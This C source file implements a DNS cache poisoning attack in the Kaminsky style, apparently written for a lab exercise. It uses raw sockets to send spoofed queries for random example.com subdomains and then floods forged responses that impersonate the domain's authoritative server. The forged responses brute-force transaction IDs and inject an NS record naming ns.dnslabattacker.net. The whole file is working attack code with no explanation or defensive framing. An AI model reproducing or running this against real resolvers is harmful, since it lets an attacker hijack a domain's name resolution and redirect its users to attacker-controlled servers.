/**********************************************
 *  Author: HanBind
 *  Time: 9 / 12 / 2020 
 **********************************************/

// Includes
#include <stdio.h>
#include <errno.h>
#include <fcntl.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>

#include <libnet.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/udp.h>

// Some Macro

#define PACKET_LEN 8192         // Packet Lenhth 
#define FLAG_QUERY 0x0100       // DNS Query Message Flags 
#define FLAG_RESPONSE 0x8400    // DNS Response Message Flags

typedef unsigned char byte;
typedef unsigned short word;
typedef unsigned int dword;


// Define IP header, UDP Header, DNS Header and RRSet
struct IPHeader{
    byte iph_header_length : 4, iph_version : 4;
    byte iph_type_of_service;
    word iph_total_length;
    word iph_identification;
    // byte iph_flags;                          // with iph_fragment_offset
    word iph_fragment_offset;
    byte iph_ttl;
    byte iph_protocol;
    word iph_chksum;
    dword iph_source_ip;
    dword iph_dest_ip; 
}; 

struct UDPHeader{
    word udph_sport;
    word udph_dport;
    word udph_len;
    word udph_chksum;
};

struct DNSHeader{
    word transaction_id;
    word flags;
    word questions_count;
    word answers_count;
    word authority_count;
    word additional_count;
};

// for convenience
struct DataEnd{
    word type;
    word class;
};
// fixed part in rr
struct ResourceRecordFixed{
    word type;
    word class;
    word ttl_l;
    word ttl_h;
    word datalen;
};



unsigned int checksum(uint16_t *usBuff, int isize){
    unsigned int cksum = 0;
    for (; isize > 1; isize -= 2){
        cksum += *usBuff++;
    }
    if (isize == 1){
        cksum += *(uint16_t *)usBuff;
    }
    return cksum;
}


uint16_t check_udp_sum(uint8_t *buffer, int len){
    unsigned long sum = 0;
    struct IPHeader *tempI = (struct IPHeader *)(buffer);
    struct UDPHeader *tempH = (struct UDPHeader *)(buffer + sizeof(struct IPHeader));
    struct DNSHeader *tempD = (struct DNSHeader *)(buffer + sizeof(struct IPHeader) + sizeof(struct UDPHeader));
    tempH->udph_chksum = 0;
    sum = checksum((uint16_t *)&(tempI->iph_source_ip), 8);
    sum += checksum((uint16_t *)tempH, len);
    sum += ntohs(IPPROTO_UDP + len);
    sum = (sum >> 16) + (sum & 0x0000ffff);
    sum += (sum >> 16);
    return (uint16_t)(~sum);
}


unsigned short csum(unsigned short *buf, int nwords){
    unsigned long sum;
    for (sum = 0; nwords > 0; nwords--)
        sum += *buf++;
    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    return (unsigned short)(~sum);
}


int response(char *_name, char* _src_ip, char* _dest_ip){
    char buffer[PACKET_LEN];
    memset(buffer, 0, PACKET_LEN);
    struct IPHeader *ip = (struct IPHeader *)buffer;
    struct UDPHeader *udp = (struct UDPHeader *)(buffer + sizeof(struct IPHeader));
    struct DNSHeader *dns = (struct DNSHeader *)(buffer + sizeof(struct IPHeader) + sizeof(struct UDPHeader));
    char *data = (buffer + sizeof(struct IPHeader) + sizeof(struct UDPHeader) + sizeof(struct DNSHeader));
    dns->flags = htons(FLAG_RESPONSE);
    dns->questions_count = htons(1);
    dns->answers_count = htons(1);
    dns->authority_count = htons(1);
    dns->additional_count = htons(1);
    strcpy(data, _name);
    int length = strlen(data) + 1;
    struct DataEnd *end = (struct DataEnd *)(data + length);
    end->type = htons(1);
    end->class = htons(1);
    char *ans = (buffer + sizeof(struct IPHeader) + sizeof(struct UDPHeader) + sizeof(struct DNSHeader) + sizeof(struct DataEnd) + length);
    strcpy(ans, _name);
    int anslength = strlen(ans) + 1;
    struct ResourceRecordFixed *ansend = (struct ResourceRecordFixed *)(ans + anslength);
    ansend->type = htons(1);
    ansend->class = htons(1);
    ansend->ttl_l = htons(0x00);
    ansend->ttl_h = htons(0xD0);
    ansend->datalen = htons(4);
    char *ansaddr = (buffer + sizeof(struct IPHeader) + sizeof(struct UDPHeader) + sizeof(struct DNSHeader) + sizeof(struct DataEnd) + length + sizeof(struct ResourceRecordFixed) + anslength);
    strcpy(ansaddr, "\1\1\1\1");
    int addrlen = strlen(ansaddr);
    char *ns = (buffer + sizeof(struct IPHeader) + sizeof(struct UDPHeader) + sizeof(struct DNSHeader) + sizeof(struct DataEnd) + length + sizeof(struct ResourceRecordFixed) + anslength + addrlen);
    strcpy(ns, "\7example\3com");
    int nslength = strlen(ns) + 1;
    struct ResourceRecordFixed *nsend = (struct ResourceRecordFixed *)(ns + nslength);
    nsend->type = htons(2);
    nsend->class = htons(1);
    nsend->ttl_l = htons(0x00);
    nsend->ttl_h = htons(0xD0);
    nsend->datalen = htons(23);
    char *nsname = (buffer + sizeof(struct IPHeader) + sizeof(struct UDPHeader) + sizeof(struct DNSHeader) + sizeof(struct DataEnd) + length + sizeof(struct ResourceRecordFixed) + anslength + addrlen + sizeof(struct ResourceRecordFixed) + nslength);
    strcpy(nsname, "\2ns\14dnslabattacker\3net");
    int nsnamelen = strlen(nsname) + 1;
    char *ar = (buffer + sizeof(struct IPHeader) + sizeof(struct UDPHeader) + sizeof(struct DNSHeader) + sizeof(struct DataEnd) + length + sizeof(struct ResourceRecordFixed) + anslength + addrlen + sizeof(struct ResourceRecordFixed) + nslength + nsnamelen);
    strcpy(ar, "\2ns\14dnslabattacker\3net");
    int arlength = strlen(ar) + 1;
    struct ResourceRecordFixed *arend = (struct ResourceRecordFixed *)(ar + arlength);
    arend->type = htons(1);
    arend->class = htons(1);
    arend->ttl_l = htons(0x00);
    arend->ttl_h = htons(0xD0);
    arend->datalen = htons(4);
    char *araddr = (buffer + sizeof(struct IPHeader) + sizeof(struct UDPHeader) + sizeof(struct DNSHeader) + sizeof(struct DataEnd) + length + sizeof(struct ResourceRecordFixed) + anslength + addrlen + sizeof(struct ResourceRecordFixed) + nslength + nsnamelen + arlength + sizeof(struct ResourceRecordFixed));
    strcpy(araddr, "\1\1\1\1");
    int araddrlen = strlen(araddr);
    struct sockaddr_in sin, din;
    int one = 1;
    const int *val = &one;
    int sd = socket(PF_INET, SOCK_RAW, IPPROTO_UDP);
    if (sd < 0) 
        printf("socket error\n");
    sin.sin_family = AF_INET;
    din.sin_family = AF_INET;
    sin.sin_port = htons(33333);
    din.sin_port = htons(53);
    sin.sin_addr.s_addr = inet_addr(_src_ip);
    din.sin_addr.s_addr = inet_addr("199.43.135.53");
    ip->iph_header_length = 5;
    ip->iph_version = 4;
    ip->iph_type_of_service = 0;
    unsigned short int packetLength = (sizeof(struct IPHeader) + sizeof(struct UDPHeader) + sizeof(struct DNSHeader) + length + sizeof(struct DataEnd) + anslength + sizeof(struct ResourceRecordFixed) + nslength + sizeof(struct ResourceRecordFixed) + addrlen + nsnamelen + arlength + sizeof(struct ResourceRecordFixed) + araddrlen); // length + DataEnd_size == UDP_payload_size
    ip->iph_total_length = htons(packetLength);
    ip->iph_identification = htons(rand()); // we give a random number for the identification#
    ip->iph_ttl = 110; // hops
    ip->iph_protocol = 17; // UDP
    ip->iph_source_ip = inet_addr("199.43.135.53");
    ip->iph_dest_ip = inet_addr(_src_ip);
    udp->udph_sport = htons(53); // source port number, I make them random... remember the lower number may be reserved
    udp->udph_dport = htons(33333);
    udp->udph_len  = htons(sizeof(struct UDPHeader) + sizeof(struct DNSHeader) + length + sizeof(struct DataEnd) + anslength + sizeof(struct ResourceRecordFixed) + nslength + sizeof(struct ResourceRecordFixed) + addrlen + nsnamelen + arlength + sizeof(struct ResourceRecordFixed) + araddrlen); // udp_header_size + udp_payload_size
    ip->iph_chksum = csum((unsigned short *)buffer, sizeof(struct IPHeader) + sizeof(struct UDPHeader));
    udp->udph_chksum = check_udp_sum(buffer, packetLength - sizeof(struct IPHeader));
    if (setsockopt(sd, IPPROTO_IP, IP_HDRINCL, val, sizeof(one)) < 0){
        printf("error\n");
        exit(-1);
    }
    int count = 0;
    int trans_id = 3000;
    while (count < 100){
        dns->transaction_id = trans_id + count;
        udp->udph_chksum = check_udp_sum(buffer, packetLength - sizeof(struct IPHeader));
        if (sendto(sd, buffer, packetLength, 0, (struct sockaddr *)&sin, sizeof(sin)) < 0)
            printf("packet send error %d which means %s\n", errno, strerror(errno));
        count++;
    }
    close(sd);
    return 0;
}


int main(int argc, char *argv[]){
    // This is to check the argc number
    if (argc != 3){
        printf("- Invalid parameters!!!\nPlease enter 2 ip addresses\nFrom first to last:src_IP  dest_IP  \n");
        exit(-1);
    }
    int sd;
    char buffer[PACKET_LEN];
    memset(buffer, 0, PACKET_LEN);
    struct IPHeader *ip = (struct IPHeader *)buffer;
    struct UDPHeader *udp = (struct UDPHeader *)(buffer + sizeof(struct IPHeader));
    struct DNSHeader *dns = (struct DNSHeader *)(buffer + sizeof(struct IPHeader) + sizeof(struct UDPHeader));
    char *data = (buffer + sizeof(struct IPHeader) + sizeof(struct UDPHeader) + sizeof(struct DNSHeader));
    dns->flags = htons(FLAG_QUERY);
    dns->questions_count = htons(1);
    strcpy(data, "\5abcde\7example\3com");
    int length = strlen(data) + 1;
    struct DataEnd *end = (struct DataEnd *)(data + length);
    end->type = htons(1);
    end->class = htons(1);
    struct sockaddr_in sin, din;
    int one = 1;
    const int *val = &one;
    dns->transaction_id = rand(); // transaction ID for the query packet, use random #
    sd = socket(PF_INET, SOCK_RAW, IPPROTO_UDP);
    if (sd < 0) // if socket fails to be created
        printf("socket error\n");
    sin.sin_family = AF_INET;
    din.sin_family = AF_INET;
    sin.sin_port = htons(33333);
    sin.sin_addr.s_addr = inet_addr(argv[2]); // this is the second argument we input into the program
    din.sin_addr.s_addr = inet_addr(argv[1]); // this is the first argument we input into the program
    ip->iph_header_length = 5;
    ip->iph_version = 4;
    ip->iph_type_of_service = 0; // Low delay
    unsigned short int packetLength = (sizeof(struct IPHeader) + sizeof(struct UDPHeader) + sizeof(struct DNSHeader) + length + sizeof(struct DataEnd)); // length + DataEnd_size == UDP_payload_size
    ip->iph_total_length = htons(packetLength);
    ip->iph_identification = htons(rand()); // we give a random number for the identification#
    ip->iph_ttl = 110; // hops
    ip->iph_protocol = 17; // UDP
    ip->iph_source_ip = inet_addr(argv[1]);
    ip->iph_dest_ip = inet_addr(argv[2]);
    udp->udph_sport = htons(33333); // source port number, I make them random... remember the lower number may be reserved
    udp->udph_dport = htons(53);
    udp->udph_len = htons(sizeof(struct UDPHeader) + sizeof(struct DNSHeader) + length + sizeof(struct DataEnd)); // udp_header_size + udp_payload_size
    ip->iph_chksum = csum((unsigned short *)buffer, sizeof(struct IPHeader) + sizeof(struct UDPHeader));
    udp->udph_chksum = check_udp_sum(buffer, packetLength - sizeof(struct IPHeader));
    if (setsockopt(sd, IPPROTO_IP, IP_HDRINCL, val, sizeof(one)) < 0){
        printf("error\n");
        exit(-1);
    }
    while (1){
        int charnumber;
        charnumber = 1 + rand() % 5;
        *(data + charnumber) += 1;
        udp->udph_chksum = check_udp_sum(buffer, packetLength - sizeof(struct IPHeader)); 
        if (sendto(sd, buffer, packetLength, 0, (struct sockaddr *)&sin, sizeof(sin)) < 0)
            printf("packet send error %d which means %s\n", errno, strerror(errno));
        sleep(0.01);
        response(data, argv[2], argv[1]);
    }
    close(sd);
    return 0;
}
